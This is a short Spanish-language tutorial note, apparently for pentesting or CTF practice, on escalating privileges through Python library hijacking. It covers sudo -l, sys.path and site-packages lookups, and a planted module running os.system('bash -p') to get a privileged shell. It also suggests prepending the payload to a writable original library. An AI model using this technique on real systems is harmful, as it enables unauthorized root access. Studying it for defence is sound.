Esta forma de escalar es similar al path hijacking, ya que utiliza el mismo concepto.

Si con `sudo -l` vemos que podemos ejecutar algun script de python como otro usuario, y dicho script importa modulos, podemos crear un modulo con el mismo nombre y ponerlo en una ruta absoluta mas relevante. 

Con el siguiente comando podemos ver el path por el que python ejecuta sus cosas:

```bash
python3 -c "import sys; print(sys.path)"
```

Suele ser `/usr/lib/python3.12`. 

Otros comandos para encontrar:

Ver todos los modulos:
```bash
sudo find / -type d -name "site-packages" 2>/dev/null
```

Buscar modulos por nombre:
```bash
sudo find / -type d -name "requests" 2>/dev/null
```

**NO SE PUEDE HIJACKEAR (Aca hay solo 20, pero hay mas):**

```
sys
os
subprocess
socket
threading
time
math
json
re
logging
pathlib
hashlib
shutil
tempfile
functools
itertools
http
urllib
selectors
select
```

---
Si vemos el path de python -> `python3 -c "import sys; print(sys.path)"`. Podemos ver que el 1er path en orden de relevancia es este -> " ", osea el directorio en donde esta el archivo que ejecuta el modulo, por lo que si creamos un script con el mismo nombre que el modulo, en la ruta donde se encuentra el script, va a ejecutar eso porque esta arriba en escala de relevancia. Podemos meterle el siguiente contenido al modulo nuestro y tenemos bash:

```python
import os
os.system("bash -p")
```

---
Tambien se puede aplicar este tipo de ataque directamente alterando el contenido de la libreria original (si es que se cuenta con los permisos) y agregar el codigo indicado arriba, no es necesario borrar todo, solo agregar esas 2 lineas arriba del todo